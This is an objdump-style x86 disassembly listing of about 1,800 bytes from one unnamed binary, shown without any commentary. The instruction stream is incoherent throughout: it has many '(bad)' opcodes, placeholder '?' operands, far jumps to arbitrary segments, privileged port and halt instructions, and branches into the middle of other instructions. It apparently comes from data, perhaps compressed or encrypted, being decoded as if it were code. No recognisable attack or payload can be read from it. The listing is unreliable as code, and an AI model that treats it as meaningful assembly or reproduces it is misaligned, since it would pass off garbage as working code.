  406377:	repnz sub dh,BYTE PTR [eax-0x42]
  40637b:	ins    DWORD PTR es:[edi],dx
  40637c:	and    BYTE PTR [ecx+0x27],bl
  40637f:	push   edi
  406380:	dec    eax
  406381:	adc    al,0x19
  406383:	sbb    eax,0x7552d66d
  406388:	pushf  
  406389:	push   0x61
  40638b:	push   ebx
  40638c:	aaa    
  40638d:	jecxz  0x4063b3
  40638f:	cld    
  406390:	fmul   QWORD PTR [ecx]
  406392:	xlat   BYTE PTR ds:[ebx]
  406393:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406394:	jmp    0x1ca5:0x5ca8c3aa
  40639b:	outs   dx,DWORD PTR ds:[esi]
  40639c:	mov    esi,0xcc7c254e
  4063a1:	fs mov eax,0x39305328
  4063a7:	adc    eax,0xd1c265b
  4063ac:	(bad)  
  4063ad:	mov    bl,al
  4063af:	pop    esp
  4063b0:	ds stos DWORD PTR es:[edi],eax
  4063b2:	fistp  QWORD PTR [edx]
  4063b4:	je     0x4063b6
  4063b6:	mov    ah,0x88
  4063b8:	and    eax,0xd89f6154
  4063bd:	ins    DWORD PTR es:[edi],dx
  4063be:	mov    ?,WORD PTR [ecx+0x1b]
  4063c1:	mov    cl,BYTE PTR [ebp-0x7542ad80]
  4063c7:	xchg   DWORD PTR [eax+0xb],esi
  4063ca:	ret    0xa765
  4063cd:	int3   
  4063ce:	call   FWORD PTR [edx]
  4063d0:	mov    ah,0xb5
  4063d2:	div    cl
  4063d4:	jge    0x40637d
  4063d6:	cwde   
  4063d7:	nop
  4063d8:	mov    eax,ds:0x9c387d69
  4063dd:	xor    al,0x8b
  4063df:	mov    ebp,0x51657705
  4063e4:	mov    esp,0x709e2660
  4063e9:	ss in  eax,0xb3
  4063ec:	pushf  
  4063ed:	and    al,0x5a
  4063ef:	inc    esp
  4063f0:	cli    
  4063f1:	inc    ecx
  4063f2:	cld    
  4063f3:	mov    bh,0xfb
  4063f5:	and    edi,ebp
  4063f7:	call   0x64a112b6
  4063fc:	scas   eax,DWORD PTR es:[edi]
  4063fd:	dec    ecx
  4063fe:	xchg   esi,eax
  4063ff:	dec    ecx
  406400:	out    0xd8,al
  406402:	jmp    0x7512:0x161c64ab
  406409:	call   0xbafa25ec
  40640e:	jmp    0x7878a9fb
  406413:	dec    esi
  406414:	xrelease xchg DWORD PTR [esi+0x55],ebx
  406418:	mov    ecx,0x7044c490
  40641d:	jbe    0x658b2b74
  406423:	ds inc esi
  406425:	js     0x4063d2
  406427:	nop
  406428:	push   edx
  406429:	sub    al,BYTE PTR [edi+0x5e]
  40642c:	sbb    BYTE PTR [ebp+0x50e1145e],0x9e
  406433:	int    0x66
  406435:	shr    DWORD PTR [edx],1
  406437:	mov    ecx,0x8a66d69e
  40643c:	xchg   esi,eax
  40643d:	push   ecx
  40643e:	mov    gs,esi
  406440:	jae    0x406442
  406442:	gs jno 0x40643e
  406445:	aas    
  406446:	push   0x74399b5f
  40644b:	mov    edi,0x13bb1e8d
  406450:	cwde   
  406451:	cmp    DWORD PTR ds:0xf4ce1f9e,ebx
  406457:	inc    esi
  406458:	sub    ch,BYTE PTR [ecx-0x5d59e416]
  40645e:	cmp    dh,BYTE PTR [edi+0x34]
  406461:	stos   BYTE PTR es:[edi],al
  406462:	sub    dh,BYTE PTR [eax]
  406464:	push   cs
  406465:	xchg   edx,eax
  406466:	sbb    edi,esi
  406468:	adc    al,0xde
  40646a:	push   ebx
  40646b:	aas    
  40646c:	stc    
  40646d:	push   ecx
  40646e:	std    
  40646f:	jge    0x406426
  406471:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406472:	popa   
  406473:	sub    WORD PTR [edi-0x526a60f6],bx
  40647a:	mov    ds:0xe58a93bb,al
  40647f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406480:	ins    DWORD PTR es:[edi],dx
  406481:	int    0x3d
  406483:	repnz sub al,0x36
  406486:	or     edx,DWORD PTR [ebp+esi*4+0x6389e91d]
  40648d:	add    DWORD PTR [edx-0x2a],ebx
  406490:	addr16 sbb eax,0x47302f99
  406496:	and    edx,DWORD PTR [esi]
  406498:	sbb    bl,al
  40649a:	retf   
  40649b:	adc    al,0xdf
  40649d:	(bad)  
  40649f:	ss mov ds,eax
  4064a2:	mov    ebx,0xbe21a17a
  4064a7:	outs   dx,BYTE PTR ds:[esi]
  4064a8:	lock test al,0xed
  4064ab:	(bad)  
  4064ac:	clc    
  4064ad:	mov    al,0x4d
  4064af:	mov    ds:0xdd2260be,al
  4064b4:	sub    eax,0xb1fa2faf
  4064b9:	xchg   BYTE PTR [edx],ah
  4064bb:	fsubr  QWORD PTR [ebx-0x42caa57f]
  4064c1:	call   FWORD PTR [edi-0x1]
  4064c4:	push   ds
  4064c5:	pop    ebx
  4064c6:	pop    ebp
  4064c7:	(bad)  
  4064c8:	(bad)  
  4064c9:	push   ebx
  4064ca:	neg    DWORD PTR [ecx+eax*2+0x19]
  4064ce:	mov    al,0xdd
  4064d0:	jae    0x40645c
  4064d2:	repnz mov dl,0xab
  4064d5:	push   esi
  4064d6:	pusha  
  4064d7:	xchg   esi,eax
  4064d8:	pop    es
  4064d9:	add    BYTE PTR [edi+0x37b6f5fd],al
  4064df:	js     0x4064f5
  4064e1:	lods   al,BYTE PTR ds:[esi]
  4064e2:	int3   
  4064e3:	shr    DWORD PTR [esi+0x7d],cl
  4064e6:	sbb    ebp,DWORD PTR [edx+ecx*2+0x1e]
  4064ea:	in     eax,dx
  4064eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064ec:	dec    edx
  4064ed:	push   esp
  4064ee:	popf   
  4064ef:	retf   0x1b89
  4064f2:	aaa    
  4064f3:	pop    ebp
  4064f4:	push   esp
  4064f5:	mov    eax,ds:0xc65fa8a
  4064fa:	clc    
  4064fb:	add    bl,BYTE PTR [ebx-0x79d10766]
  406501:	imul   esi,DWORD PTR [esp+eax*4-0x5e],0xffffffa8
  406506:	push   esi
  406507:	stos   BYTE PTR es:[edi],al
  406508:	add    ebx,edi
  40650a:	mov    edi,0xdb7ed5f2
  40650f:	or     ebp,DWORD PTR [edx]
  406511:	ror    BYTE PTR [ecx+edi*4-0x31],cl
  406515:	(bad)  
  406517:	sub    DWORD PTR [esi],ebp
  406519:	and    bh,bl
  40651b:	sar    DWORD PTR ds:0x34f3c97d,cl
  406521:	shr    esp,1
  406523:	test   DWORD PTR ds:0xdc39df79,0xdd28c9c
  40652d:	scas   al,BYTE PTR es:[edi]
  40652e:	sahf   
  40652f:	popf   
  406530:	add    BYTE PTR [ecx],dh
  406532:	xchg   esp,eax
  406533:	pop    esi
  406534:	mov    dh,0x20
  406536:	adc    eax,esp
  406538:	jae    0x4064bd
  40653a:	in     al,dx
  40653b:	jle    0x40659c
  40653d:	icebp  
  40653e:	cmp    DWORD PTR [ebp+edx*1-0x7b52511e],esi
  406545:	push   ss
  406546:	push   ecx
  406547:	jge    0x4064ca
  406549:	xor    BYTE PTR [ebp-0x69],cl
  40654c:	aaa    
  40654d:	les    eax,FWORD PTR [edi-0x3f181ed1]
  406553:	enter  0x55e5,0xb4
  406557:	dec    eax
  406558:	cld    
  406559:	mov    edx,0x6c31ce11
  40655e:	leave  
  40655f:	(bad)  
  406560:	imul   BYTE PTR [eax+edi*2+0x4f]
  406564:	test   eax,0xd405c6b0
  406569:	xchg   edi,eax
  40656a:	push   ecx
  40656b:	sub    edi,DWORD PTR [edi-0x47]
  40656e:	in     al,dx
  40656f:	mov    esp,0xd1aae9c2
  406574:	xchg   DWORD PTR [esi-0x5c8c1bd4],edi
  40657a:	adc    edx,DWORD PTR [ecx+0x118e8797]
  406580:	add    bh,dh
  406582:	fst    QWORD PTR [edx]
  406584:	inc    edi
  406585:	(bad)  
  406586:	xor    BYTE PTR [esi-0x7ef00c61],ch
  40658c:	popa   
  40658d:	popf   
  40658e:	test   eax,0x728da5da
  406593:	push   0xffffffd5
  406595:	jno    0x406539
  406597:	lock pop ss
  406599:	jecxz  0x40657c
  40659b:	cli    
  40659c:	cld    
  40659d:	aaa    
  40659e:	fcomp  DWORD PTR ds:0x2612b17
  4065a4:	inc    esi
  4065a5:	dec    ebp
  4065a6:	shl    DWORD PTR [ecx+0x3e],0xeb
  4065aa:	or     BYTE PTR [esi+0x1e],cl
  4065ad:	inc    eax
  4065ae:	mov    WORD PTR [ebp-0x38],?
  4065b1:	sub    eax,0xf0973335
  4065b6:	pushf  
  4065b7:	shl    dl,0xc2
  4065ba:	loopne 0x406544
  4065bc:	adc    al,cl
  4065be:	pusha  
  4065bf:	cli    
  4065c0:	pop    ebx
  4065c1:	sub    al,0xca
  4065c3:	mov    ebx,0x4b512cf4
  4065c8:	test   edx,ebp
  4065ca:	dec    esp
  4065cb:	sbb    al,0xc0
  4065cd:	outs   dx,BYTE PTR ds:[esi]
  4065ce:	inc    ebp
  4065cf:	rcl    BYTE PTR [ecx-0x6b72fdc3],0xa8
  4065d6:	mov    ebp,0xda0de59b
  4065db:	cmp    BYTE PTR [eax],0x8f
  4065de:	test   BYTE PTR [edi+0x4d],ah
  4065e1:	cmp    al,0x79
  4065e3:	mov    ds:0x688fcb62,eax
  4065e8:	(bad)  
  4065e9:	cmp    ch,bl
  4065eb:	jmp    0xbb7e8746
  4065f0:	sub    al,BYTE PTR ss:[ebp+esi*2-0x286ea89c]
  4065f8:	enter  0x7635,0x44
  4065fc:	sub    eax,0xc8329381
  406601:	jns    0x406650
  406603:	inc    ebp
  406604:	fcom   QWORD PTR [edi+0x651d16c]
  40660a:	jb     0x40661b
  40660c:	push   ebx
  40660d:	pop    ecx
  40660e:	jl     0x406678
  406610:	sub    al,0x7f
  406612:	daa    
  406613:	jb     0x4065ca
  406615:	neg    BYTE PTR [esp+ebx*2]
  406618:	adc    esi,esi
  40661a:	mov    eax,ds:0x96fac6f1
  40661f:	mov    cl,0xbf
  406621:	paddsw mm7,QWORD PTR [ebx+0x3ca7eb34]
  406628:	push   ecx
  406629:	or     ebx,DWORD PTR [edx]
  40662b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40662c:	sbb    al,0x97
  40662e:	hlt    
  40662f:	mov    ah,0xef
  406631:	enter  0x9a12,0xb2
  406635:	add    esi,eax
  406637:	fild   QWORD PTR [edi+0x69]
  40663a:	neg    edx
  40663c:	xchg   edx,eax
  40663d:	inc    esi
  40663e:	mov    eax,ds:0xbb8b92c0
  406643:	mov    ebx,0xdef24894
  406648:	jno    0x406646
  40664a:	mov    eax,ds:0xfa7fd62a
  40664f:	xor    BYTE PTR [ebx-0x18],dl
  406652:	sbb    dl,BYTE PTR [esi+0x0]
  406655:	(bad)  
  406656:	xor    al,0xb1
  406658:	jle    0x4066d3
  40665a:	div    BYTE PTR [ebp+0x7]
  40665d:	call   DWORD PTR [ecx-0x76]
  406660:	and    DWORD PTR [edx+0x36babdb7],ebp
  406666:	dec    edx
  406667:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406668:	fs fdivr st(0),st
  40666b:	ja     0x4065f7
  40666d:	gs push ecx
  40666f:	and    al,0x75
  406671:	and    dh,BYTE PTR [esi-0x38b88e67]
  406677:	sub    al,0x53
  406679:	inc    ecx
  40667a:	and    cl,BYTE PTR [eax]
  40667c:	cdq    
  40667d:	(bad)  
  40667f:	xor    BYTE PTR ds:[esi+0x20],ah
  406683:	hlt    
  406684:	mov    cl,0xa1
  406686:	mov    eax,ds:0xb1471235
  40668b:	jbe    0x406621
  40668d:	sbb    cl,BYTE PTR [edx]
  40668f:	neg    DWORD PTR [edi+0x19]
  406692:	inc    esp
  406693:	test   DWORD PTR [eax+0x4d],esp
  406696:	aam    0x21
  406698:	or     bh,dh
  40669a:	sub    BYTE PTR [eax],0xa7
  40669d:	add    eax,0xb5ef7307
  4066a2:	ja     0x40671f
  4066a4:	test   eax,0xa97464cd
  4066a9:	mov    cl,cl
  4066ab:	hlt    
  4066ac:	clc    
  4066ad:	fnstenv [ecx+ecx*4-0x71]
  4066b1:	sub    eax,0x502cf3e1
  4066b6:	push   cs
  4066b7:	sbb    edi,DWORD PTR [ebx+0x79]
  4066ba:	clc    
  4066bb:	out    0x78,al
  4066bd:	loope  0x40667c
  4066bf:	test   BYTE PTR ds:0xcedfb6f1,0xac
  4066c6:	add    BYTE PTR [edx],ah
  4066c8:	or     bh,dh
  4066ca:	popa   
  4066cb:	jbe    0x40668c
  4066cd:	in     al,0x9a
  4066cf:	and    ch,BYTE PTR [eax]
  4066d1:	fwait
  4066d2:	mov    ch,0x45
  4066d4:	and    BYTE PTR [ebx],bh
  4066d6:	add    BYTE PTR [edi],0x8d
  4066d9:	pusha  
  4066da:	mov    WORD PTR [edx+edi*2-0x4e],ss
  4066de:	sbb    ch,BYTE PTR [eax]
  4066e0:	xor    BYTE PTR [edi+0x3],0x11
  4066e4:	cld    
  4066e5:	sar    DWORD PTR [eax+edx*4+0x5e189f24],0x58
  4066ed:	ret    0xeca2
  4066f0:	ficom  WORD PTR [esi]
  4066f2:	js     0x4066bc
  4066f4:	sahf   
  4066f5:	jnp    0x4066a5
  4066f7:	push   edi
  4066f8:	dec    esp
  4066f9:	enter  0x57bd,0xf9
  4066fd:	mov    eax,ds:0x9776f01e
  406702:	and    eax,0x7de156b6
  406707:	fbstp  TBYTE PTR [eax]
  406709:	mov    edi,0x50009aae
  40670e:	mov    al,ds:0x92e32944
  406713:	pop    eax
  406714:	cs add al,0x3f
  406717:	add    eax,0x31cb34ff
  40671c:	fidivr WORD PTR [edx]
  40671e:	sbb    bl,BYTE PTR [ecx]
  406720:	cmp    DWORD PTR [edx+0x71],esp
  406723:	push   ss
  406724:	or     DWORD PTR [ecx],0x5158968d
  40672a:	pusha  
  40672b:	ficomp DWORD PTR [ebp-0x2d]
  40672e:	jmp    0x7de6:0x79b0f066
  406735:	xor    BYTE PTR [ebx+0x3d],dl
  406738:	dec    esp
  406739:	jmp    0xa60eec9e
  40673e:	jae    0x406785
  406740:	shl    DWORD PTR [edx-0x55],cl
  406743:	popf   
  406744:	cli    
  406745:	fcomp  QWORD PTR cs:[ecx+esi*8]
  406749:	push   0xc0071517
  40674e:	fadd   DWORD PTR [edx-0x4007d5c6]
  406754:	xor    ecx,DWORD PTR [ebp-0x7d2cabc0]
  40675a:	loop   0x4067ca
  40675c:	sub    dl,BYTE PTR [ecx+ecx*8]
  40675f:	repz mov esp,0x1861dd45
  406765:	pushf  
  406766:	pop    ecx
  406767:	sbb    BYTE PTR [ebx-0x33],cl
  40676a:	jnp    0x406707
  40676c:	push   edi
  40676d:	cwde   
  40676e:	les    ecx,FWORD PTR [ebx+0x34]
  406771:	sub    eax,0x953a39d0
  406776:	push   cs
  406777:	in     al,dx
  406778:	xchg   DWORD PTR [edx+ebx*2-0x6e05703a],edx
  40677f:	jmp    0x3736:0x43abae66
  406786:	dec    esi
  406787:	fistp  WORD PTR [edi+0x153fd6b4]
  40678d:	jbe    0x40680d
  40678f:	mov    eax,0xaa2a003f
  406794:	daa    
  406795:	mov    bh,cl
  406797:	mov    eax,0x7d94cd04
  40679c:	rcl    BYTE PTR [esi-0x248c6c39],cl
  4067a2:	or     BYTE PTR [ecx+0xb96a58],bh
  4067a8:	jno    0x40675e
  4067aa:	scas   al,BYTE PTR es:[edi]
  4067ab:	sub    ebp,DWORD PTR ds:0x7a2f3d70
  4067b1:	(bad)  
  4067b2:	push   edx
  4067b3:	and    dh,ch
  4067b5:	and    eax,0xe5415a3e
  4067ba:	jl     0x406816
  4067bc:	inc    ebp
  4067bd:	jle    0x406780
  4067bf:	(bad)  
  4067c0:	push   0x9f58a1be
  4067c5:	or     edi,esi
  4067c7:	cs pop ebx
  4067c9:	jne    0x406819
  4067cb:	mov    dh,BYTE PTR [esi-0x699eb668]
  4067d1:	and    eax,0xac5b251e
  4067d6:	xchg   ebp,eax
  4067d7:	popa   
  4067d8:	mov    edi,0x3d533171
  4067dd:	jmp    0x4fddc135
  4067e2:	adc    BYTE PTR [edi],bh
  4067e4:	inc    ebx
  4067e5:	inc    edi
  4067e6:	icebp  
  4067e7:	push   esi
  4067e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067e9:	fs je  0x406793
  4067ec:	in     al,0xd7
  4067ee:	push   ds
  4067ef:	xchg   ebx,eax
  4067f0:	jg     0x4067a5
  4067f2:	sbb    al,0x29
  4067f4:	(bad)  
  4067f5:	mov    edi,0x29948ff
  4067fa:	pop    edi
  4067fb:	adc    ecx,DWORD PTR [edi+0x33]
  4067fe:	fs fwait
  406800:	in     al,0xbb
  406802:	je     0x406842
  406804:	inc    ebp
  406805:	(bad)  
  406806:	cmp    BYTE PTR [ebx+0x4c],ch
  406809:	cmp    ebx,DWORD PTR [edi+eax*4-0x246851b6]
  406810:	mov    al,ds:0x3ee1ce58
  406815:	les    edx,FWORD PTR [ebp+0xc]
  406818:	mul    DWORD PTR [ecx+esi*2+0x26]
  40681c:	xchg   edx,eax
  40681d:	sub    BYTE PTR [ecx],bl
  40681f:	xchg   edx,eax
  406820:	pop    edx
  406821:	sar    DWORD PTR [edi-0x39],0x87
  406825:	xlat   BYTE PTR ds:[ebx]
  406826:	cli    
  406827:	(bad)  
  406828:	hlt    
  406829:	fstp   DWORD PTR [edx]
  40682b:	arpl   WORD PTR [edx-0x2bfbcedd],dx
  406831:	out    dx,eax
  406832:	test   al,0x1d
  406834:	loopne 0x4067ce
  406836:	test   al,0xe2
  406838:	fdiv   QWORD PTR [ecx+0x6b6fd95b]
  40683e:	mov    ch,0xea
  406840:	jne    0x4068a4
  406842:	cdq    
  406843:	and    BYTE PTR [esi+0x33],dl
  406846:	cmp    DWORD PTR [ebx],edx
  406848:	cwde   
  406849:	in     al,0x1e
  40684b:	ja     0x406865
  40684d:	jmp    0xe453268
  406852:	(bad)  
  406855:	lea    ebp,[esi+0x37]
  406858:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406859:	es inc edi
  40685b:	sbb    BYTE PTR [edi+ebx*4+0x5a],0xd8
  406860:	jne    0x4068a1
  406862:	cmp    BYTE PTR [eax-0x2dee6056],bh
  406868:	inc    eax
  406869:	xor    eax,0xc90b133e
  40686e:	xlat   BYTE PTR ds:[ebx]
  40686f:	es jns 0x40686a
  406872:	neg    DWORD PTR [ebx+0x65]
  406875:	xor    DWORD PTR [ecx-0x47],edx
  406878:	push   0xffffffb8
  40687a:	jo     0x4068c1
  40687c:	fcom   st(6)
  40687e:	mov    ebp,0x1d4d9286
  406883:	out    0xd7,al
  406885:	rol    BYTE PTR [eax],cl
  406887:	xchg   edx,eax
  406888:	xor    BYTE PTR ds:[eax],ah
  40688b:	stos   DWORD PTR es:[edi],eax
  40688c:	mov    BYTE PTR [ecx+edx*2-0x1a],dh
  406890:	push   ss
  406891:	(bad)  
  406892:	xchg   esp,eax
  406893:	sbb    BYTE PTR [ebp-0x6d494f63],cl
  406899:	mov    dl,0x75
  40689b:	jne    0x4b8bc16a
  4068a1:	xor    DWORD PTR [ecx],0x7d19c549
  4068a7:	dec    eax
  4068a8:	xchg   ebp,eax
  4068a9:	xchg   ebp,eax
  4068aa:	or     ebp,0xbcc6df38
  4068b0:	xor    ah,dl
  4068b2:	fisub  WORD PTR [ebx-0x3d98e357]
  4068b8:	mov    eax,0x910698bb
  4068bd:	or     BYTE PTR [eax-0x2d8324ad],ch
  4068c3:	add    esi,DWORD PTR ds:[ebx-0x1c1fc1d3]
  4068ca:	push   edi
  4068cb:	fadd   DWORD PTR [ecx+0x10]
  4068ce:	fistp  WORD PTR [esi]
  4068d0:	ins    BYTE PTR es:[edi],dx
  4068d1:	das    
  4068d2:	not    ebp
  4068d4:	mov    cl,0x9
  4068d6:	out    dx,al
  4068d7:	scas   eax,DWORD PTR es:[edi]
  4068d8:	sar    DWORD PTR [esi+0x70],1
  4068db:	mov    BYTE PTR [eax+0x16d3d8ff],cl
  4068e1:	fs dec eax
  4068e3:	out    dx,al
  4068e4:	rcl    DWORD PTR [ebx],cl
  4068e6:	fnsave [ebx-0x31bdce29]
  4068ec:	mov    ch,0xc4
  4068ee:	xchg   esi,eax
  4068ef:	repz mov al,0x6d
  4068f2:	add    dl,bl
  4068f4:	cld    
  4068f5:	aas    
  4068f6:	xchg   ebp,eax
  4068f7:	pop    eax
  4068f8:	push   esp
  4068f9:	pop    edx
  4068fa:	jg     0x406908
  4068fc:	imul   BYTE PTR ds:0xe9bfbb40
  406902:	(bad)  
  406903:	dec    eax
  406904:	test   al,0x10
  406906:	ror    BYTE PTR [eax+0x79d4fd62],cl
  40690c:	xor    al,0x58
  40690e:	xor    ebx,DWORD PTR [edi-0x5d67e3f4]
  406914:	xchg   dl,ah
  406916:	test   dl,ah
  406918:	adc    DWORD PTR [edi-0x8d6b602],ecx
  40691e:	ret    0x4b92
  406921:	mov    ecx,0x73df8d26
  406926:	sbb    BYTE PTR [eax-0x5d210070],ch
  40692c:	dec    ecx
  40692d:	add    DWORD PTR [ebx+0x618c90ef],ebx
  406933:	push   esi
  406934:	xor    BYTE PTR [edx+ebx*8],0x66
  406938:	test   eax,0x9fd3e46
  40693d:	cmc    
  40693e:	mul    BYTE PTR [esi]
  406940:	rcl    BYTE PTR [edx],1
  406942:	jl     0x40697a
  406944:	xchg   esi,eax
  406945:	and    cl,ch
  406947:	add    cl,BYTE PTR [edi-0x4a]
  40694a:	in     al,0x43
  40694c:	gs retf 
  40694e:	dec    cl
  406950:	push   es
  406951:	sar    DWORD PTR [edi+ecx*1],0x25
  406955:	lock sbb BYTE PTR gs:[esp+eax*2],cl
  40695a:	mov    ah,0xfa
  40695c:	enter  0xc52a,0x78
  406960:	retf   
  406961:	outs   dx,DWORD PTR ds:[esi]
  406962:	xchg   edx,eax
  406963:	cmp    BYTE PTR [esi+0x33],cl
  406966:	adc    al,0x3d
  406968:	jge    0x4069bb
  40696a:	and    BYTE PTR [ebx],dh
  40696c:	jb     0x4069b3
  40696e:	js     0x4068f4
  406970:	(bad)  
  406971:	pop    esp
  406972:	mov    ds:0xcaa7063e,al
  406977:	jl     0x40690a
  406979:	cmp    ecx,ebx
  40697b:	das    
  40697c:	ss push edi
  40697e:	fadd   QWORD PTR [edx+0x5fd1667]
  406984:	jle    0x4069c7
  406986:	mov    esp,0x963e5b0d
  40698b:	cmp    BYTE PTR [ebx+0xf10a494],dl
  406991:	jmp    0x8538:0x8dd3a4ec
  406998:	das    
  406999:	xchg   ebp,eax
  40699a:	mov    cs,ebx
  40699c:	aam    0x1a
  40699e:	pop    ebx
  40699f:	stos   BYTE PTR es:[edi],al
  4069a0:	cmp    eax,0xc1f40df7
  4069a5:	fs enter 0x41f6,0x60
  4069aa:	inc    esp
  4069ab:	adc    al,0x68
  4069ad:	(bad)
  4069b1:	add    eax,DWORD PTR [ebx+0x0]
  4069b4:	xlat   BYTE PTR ds:[ebx]
  4069b5:	or     DWORD PTR [edi-0x63fa1bf],0xffffffab
  4069bc:	add    al,0x59
  4069be:	es ret 
  4069c0:	dec    edx
  4069c1:	add    eax,DWORD PTR [edi]
  4069c3:	adc    ebp,DWORD PTR [edx]
  4069c5:	in     eax,dx
  4069c6:	xor    eax,0xe13381c1
  4069cb:	popa   
  4069cc:	ret    0xc002
  4069cf:	ret    0xf850
  4069d2:	inc    ebx
  4069d3:	fstp   QWORD PTR [edx+ebp*2+0x16b0d041]
  4069da:	popa   
  4069db:	xor    BYTE PTR [eax+0x58],dl
  4069de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069df:	cmc    
  4069e0:	jle    0x406a43
  4069e2:	mov    al,ds:0xeb3b45eb
  4069e7:	sar    BYTE PTR [esp+ebp*2+0x7f],cl
  4069eb:	stos   DWORD PTR es:[edi],eax
  4069ec:	sbb    eax,0x4833f1e4
  4069f1:	and    ebp,edx
  4069f3:	jno    0x40699a
  4069f5:	addr16 loopne 0x406a52
  4069f8:	retf   0xd71b
  4069fb:	push   edi
  4069fc:	cmp    DWORD PTR [edi],esp
  4069fe:	jne    0x4069b7
  406a00:	or     DWORD PTR ds:0x6598cb28,edx
  406a06:	xor    al,0xd2
  406a08:	mov    edi,0xe006634e
  406a0d:	mov    BYTE PTR [ebx-0x2253b5db],dh
  406a13:	or     al,0x69
  406a15:	bound  esp,QWORD PTR [eax-0x47fec6fe]
  406a1b:	jg     0x406a09
  406a1d:	ja     0x406a3c
  406a1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a20:	jno    0x4069c3
  406a22:	test   eax,0x23878dde
  406a27:	mov    al,0xb7
  406a29:	or     DWORD PTR [ebp-0xa799309],ebp
  406a2f:	mov    WORD PTR [ecx+0x50],?
  406a32:	pop    eax
  406a33:	(bad)
  406a37:	mov    al,BYTE PTR [ebp-0x748a496]
  406a3d:	mov    bl,0x58
  406a3f:	fcom   QWORD PTR [eax+0x19]
  406a42:	or     DWORD PTR [edi],0xdd447a26
  406a48:	cmp    BYTE PTR ds:0xbe18b58e,bl
  406a4e:	ss dec esp
  406a50:	sbb    dh,bh
  406a52:	push   cs
  406a53:	adc    BYTE PTR [ebx-0x2274aa09],0x96
  406a5a:	or     ch,BYTE PTR [ecx+esi*4+0x39]
  406a5e:	push   ss
  406a5f:	into   
  406a60:	fiadd  DWORD PTR [ebx-0x48]
  406a63:	mov    al,ds:0xa83127a4
  406a68:	mov    esi,ecx
  406a6a:	xor    BYTE PTR [ecx+0x260a416f],bh
  406a70:	push   ss
  406a71:	jecxz  0x4069ff
  406a73:	mov    bh,0xcc
  406a75:	xor    dh,BYTE PTR [eax+eiz*2-0x7d]
  406a79:	data16 aas 
  406a7b:	shl    DWORD PTR [ebp-0x41],0xe5
  406a7f:	fldenv [ebx-0x4]
  406a82:	out    0x18,al
  406a84:	jmp    0x9b53:0x6846e54a
  406a8b:	xor    esi,DWORD PTR fs:[eax+0x23]
  406a8f:	adc    eax,0x7e03415f
  406a94:	pop    edx
  406a95:	lods   al,BYTE PTR ds:[esi]
  406a96:	mov    eax,0x3532d915
  406a9b:	xor    dh,ch
  406a9d:	inc    ebx
  406a9e:	mov    DWORD PTR [edx+0x7aae4730],ebx
  406aa4:	imul   esp,DWORD PTR [eax+eax*8-0x575093d8],0x1d
  406aac:	ins    DWORD PTR es:[edi],dx
  406aad:	in     eax,0xb3
  406aaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ab0:	icebp  
  406ab1:	aas    
  406ab2:	dec    edi
  406ab3:	pop    ds
  406ab4:	pop    ds
  406ab5:	cli    
  406ab6:	jno    0x406b2e
  406ab8:	(bad)  
  406ab9:	push   ss
  406aba:	sbb    bl,bh
  406abc:	arpl   WORD PTR [ecx-0x6b61d0cd],dx
  406ac2:	dec    ebp
  406ac3:	sbb    dl,ch
  406ac5:	adc    edx,0xeba76908
  406acb:	mov    ebx,esp
  406acd:	xchg   ch,ch
  406acf:	add    DWORD PTR [esi],esp
  406ad1:	call   0xaf77:0xe01c2b99
  406ad8:	mov    ecx,0x266353c7
  406add:	push   ebp
  406ade:	or     dh,BYTE PTR [esi]
  406ae0:	xchg   edx,eax
  406ae1:	push   0x826ab8cf
  406ae6:	mov    DWORD PTR [ecx+0x5cd43090],ecx
  406aec:	daa    
  406aed:	adc    BYTE PTR [esi+0x6e],bl
  406af0:	lds    ebp,FWORD PTR [ebp-0x55]
  406af3:	or     DWORD PTR [esi],0x708f96b4
  406af9:	call   0x592e3746
  406afe:	pop    es
  406aff:	pop    ebx
  406b00:	pop    edi
  406b01:	jmp    0x7e2b:0x7a6fc4ea
  406b08:	pop    ss
  406b09:	shl    DWORD PTR [ecx],cl
  406b0b:	jne    0x406b63
  406b0d:	hlt    
  406b0e:	sub    eax,0x6297b3f0
  406b13:	inc    DWORD PTR [ebp-0x57]
  406b16:	test   BYTE PTR ds:0x9e1816a0,0x47
  406b1d:	lahf   
  406b1e:	cmp    eax,0x859c0fa6
  406b23:	fisub  DWORD PTR [ecx]
  406b25:	call   DWORD PTR [esi+0x9]
  406b28:	mov    edx,0xbef3ad0e
  406b2d:	ins    BYTE PTR es:[edi],dx
  406b2e:	add    esi,ebx
  406b30:	popa   
  406b31:	pop    es
  406b32:	in     eax,0xb2
  406b34:	jp     0x406ace
  406b36:	out    dx,al
  406b37:	(bad)  
  406b38:	out    0xda,eax
  406b3a:	cmp    DWORD PTR [eax+0x779c9b93],edx
  406b40:	push   ss
  406b41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b42:	jge    0x406aee
  406b44:	mov    edi,edi
  406b46:	xor    eax,0xe27bd386
  406b4b:	push   esi
  406b4c:	or     DWORD PTR [ebx+0xd],esi
  406b4f:	shl    eax,cl
  406b51:	sub    esi,DWORD PTR [ecx]
  406b53:	lds    eax,FWORD PTR [eax+0x31]
  406b56:	and    edi,ebp
  406b58:	sub    edx,DWORD PTR [ebx-0x664a2f22]
  406b5e:	cli    
  406b5f:	lods   al,BYTE PTR ds:[esi]
  406b60:	inc    eax
  406b61:	sar    esp,1
  406b63:	push   0x14
  406b65:	pop    esp
  406b66:	xchg   DWORD PTR [ebx+0x6d],edi
  406b69:	adc    eax,0x1a710f41
  406b6e:	scas   eax,DWORD PTR es:[edi]
  406b6f:	mov    ds:0x658aa278,al
  406b74:	jns    0x406b47
  406b76:	hlt    
  406b77:	inc    BYTE PTR [ecx-0x6c0cd5af]
  406b7d:	xor    dh,ch
  406b7f:	and    al,0xac
  406b81:	xor    ah,BYTE PTR [eax-0x84d3ae1]
  406b87:	jae    0x406b97
  406b89:	bound  esp,QWORD PTR [ecx-0x6e]
  406b8c:	repz adc DWORD PTR [edx+0x5c],ebp
  406b90:	mov    cl,0xb8
  406b92:	push   ecx
  406b93:	je     0x406b4d
